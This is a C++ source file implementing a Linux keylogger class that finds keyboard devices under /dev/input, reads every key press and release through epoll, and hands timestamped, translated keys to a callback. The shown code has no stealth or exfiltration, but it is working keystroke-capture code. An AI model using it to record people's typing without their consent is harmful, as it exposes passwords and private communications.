#ifdef __linux__

#include <cerrno>
#include <chrono>
#include <cstdio>
#include <fcntl.h>
#include <iostream>
#include <string>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>

#include "keylogger_linux.hpp"

// ---- key translation -------------------------------------------------------

static std::string translateKeyCode(unsigned int code) {
    switch (code) {
        case KEY_SPACE:       return "[SPACE]";
        case KEY_ENTER:
        case KEY_KPENTER:     return "[ENTER]";
        case KEY_TAB:         return "[TAB]";
        case KEY_BACKSPACE:   return "[BACKSPACE]";
        case KEY_DELETE:      return "[DELETE]";
        case KEY_ESC:         return "[ESC]";
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:  return "[SHIFT]";
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL:   return "[CTRL]";
        case KEY_LEFTALT:
        case KEY_RIGHTALT:    return "[ALT]";
        case KEY_CAPSLOCK:    return "[CAPS]";
        case KEY_UP:          return "[UP]";
        case KEY_DOWN:        return "[DOWN]";
        case KEY_LEFT:        return "[LEFT]";
        case KEY_RIGHT:       return "[RIGHT]";
        case KEY_INSERT:      return "[INSERT]";
        case KEY_HOME:        return "[HOME]";
        case KEY_END:         return "[END]";
        case KEY_PAGEUP:      return "[PGUP]";
        case KEY_PAGEDOWN:    return "[PGDN]";
        case KEY_LEFTMETA:
        case KEY_RIGHTMETA:   return "[SUPER]";
        case KEY_F1:          return "[F1]";
        case KEY_F2:          return "[F2]";
        case KEY_F3:          return "[F3]";
        case KEY_F4:          return "[F4]";
        case KEY_F5:          return "[F5]";
        case KEY_F6:          return "[F6]";
        case KEY_F7:          return "[F7]";
        case KEY_F8:          return "[F8]";
        case KEY_F9:          return "[F9]";
        case KEY_F10:         return "[F10]";
        case KEY_F11:         return "[F11]";
        case KEY_F12:         return "[F12]";

        case KEY_Q: return "q"; case KEY_W: return "w";
        case KEY_E: return "e"; case KEY_R: return "r";
        case KEY_T: return "t"; case KEY_Y: return "y";
        case KEY_U: return "u"; case KEY_I: return "i";
        case KEY_O: return "o"; case KEY_P: return "p";
        case KEY_A: return "a"; case KEY_S: return "s";
        case KEY_D: return "d"; case KEY_F: return "f";
        case KEY_G: return "g"; case KEY_H: return "h";
        case KEY_J: return "j"; case KEY_K: return "k";
        case KEY_L: return "l"; case KEY_Z: return "z";
        case KEY_X: return "x"; case KEY_C: return "c";
        case KEY_V: return "v"; case KEY_B: return "b";
        case KEY_N: return "n"; case KEY_M: return "m";

        case KEY_1: return "1"; case KEY_2: return "2";
        case KEY_3: return "3"; case KEY_4: return "4";
        case KEY_5: return "5"; case KEY_6: return "6";
        case KEY_7: return "7"; case KEY_8: return "8";
        case KEY_9: return "9"; case KEY_0: return "0";
        case KEY_MINUS:       return "-";
        case KEY_EQUAL:       return "=";
        case KEY_LEFTBRACE:   return "[";
        case KEY_RIGHTBRACE:  return "]";
        case KEY_SEMICOLON:   return ";";
        case KEY_APOSTROPHE:  return "'";
        case KEY_GRAVE:       return "`";
        case KEY_BACKSLASH:   return "\\";
        case KEY_COMMA:       return ",";
        case KEY_DOT:         return ".";
        case KEY_SLASH:       return "/";
        default: {
            char buf[12];
            snprintf(buf, sizeof(buf), "[KEY_%u]", code);
            return buf;
        }
    }
}

// ---- keyboard detection ----------------------------------------------------

static bool isKeyboard(int fd) {
    uint8_t evBits[(EV_MAX + 7) / 8] = {};
    if (ioctl(fd, EVIOCGBIT(0, sizeof(evBits)), evBits) < 0) return false;
    if (!(evBits[EV_KEY / 8] & (1u << (EV_KEY % 8)))) return false;

    uint8_t keyBits[(KEY_MAX + 7) / 8] = {};
    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keyBits)), keyBits) < 0) return false;

    auto has = [&](int k) -> bool {
        return (keyBits[k / 8] & (1u << (k % 8))) != 0;
    };

    if (!has(KEY_Q) || !has(KEY_A) || !has(KEY_Z) || !has(KEY_SPACE)) return false;
    if (has(BTN_MOUSE)) return false;

    return true;
}

static std::vector<int> openKeyboards() {
    std::vector<int> fds;
    for (int i = 0; i < 32; ++i) {
        char path[32];
        snprintf(path, sizeof(path), "/dev/input/event%d", i);
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;
        if (isKeyboard(fd))
            fds.push_back(fd);
        else
            close(fd);
    }
    return fds;
}

// ---- LinuxKeylogger --------------------------------------------------------

LinuxKeylogger::~LinuxKeylogger() { stop(); }

bool LinuxKeylogger::start() {
    if (m_running.exchange(true)) return true;

    m_fds = openKeyboards();
    if (m_fds.empty()) {
        std::cerr << "No readable keyboard devices found.\n"
                  << "Add your user to the 'input' group with:\n"
                  << "  sudo usermod -a -G input $USER\n"
                  << "Then log out and back in.\n";
        m_running = false;
        return false;
    }

    m_stopFd = eventfd(0, EFD_NONBLOCK);
    if (m_stopFd < 0) {
        for (int fd : m_fds) close(fd);
        m_fds.clear();
        m_running = false;
        return false;
    }

    m_thread = std::thread(&LinuxKeylogger::threadLoop, this);
    return true;
}

void LinuxKeylogger::stop() {
    if (!m_running.exchange(false)) return;
    if (m_stopFd >= 0) {
        uint64_t val = 1;
        (void)write(m_stopFd, &val, sizeof(val));
    }
    if (m_thread.joinable()) m_thread.join();
    for (int fd : m_fds) close(fd);
    m_fds.clear();
    if (m_stopFd >= 0) { close(m_stopFd); m_stopFd = -1; }
}

void LinuxKeylogger::setEventCallback(std::function<void(const KeyEvent&)> cb) {
    std::lock_guard<std::mutex> lk(m_mu);
    m_callback = std::move(cb);
}

void LinuxKeylogger::threadLoop() {
    int epfd = epoll_create1(0);
    if (epfd < 0) return;

    epoll_event stopEv{};
    stopEv.events  = EPOLLIN;
    stopEv.data.fd = m_stopFd;
    epoll_ctl(epfd, EPOLL_CTL_ADD, m_stopFd, &stopEv);

    for (int fd : m_fds) {
        epoll_event ev{};
        ev.events  = EPOLLIN;
        ev.data.fd = fd;
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
    }

    epoll_event events[16];
    bool done = false;
    while (!done) {
        int n = epoll_wait(epfd, events, 16, -1);
        if (n < 0) {
            if (errno == EINTR) continue;
            break;
        }
        for (int i = 0; i < n && !done; ++i) {
            if (events[i].data.fd == m_stopFd) { done = true; break; }

            input_event ie;
            while (read(events[i].data.fd, &ie, sizeof(ie)) == (ssize_t)sizeof(ie)) {
                if (ie.type  != EV_KEY) continue;
                if (ie.value == 2)      continue;

                KeyEvent ke;
                ke.virtualKey  = ie.code;
                ke.translated  = translateKeyCode(ie.code);
                ke.timestampMs = static_cast<int64_t>(
                    std::chrono::duration_cast<std::chrono::milliseconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count());
                ke.keyDown = (ie.value == 1);

                std::lock_guard<std::mutex> lk(m_mu);
                if (m_callback) m_callback(ke);
            }
        }
    }
    close(epfd);
}

#endif // __linux__
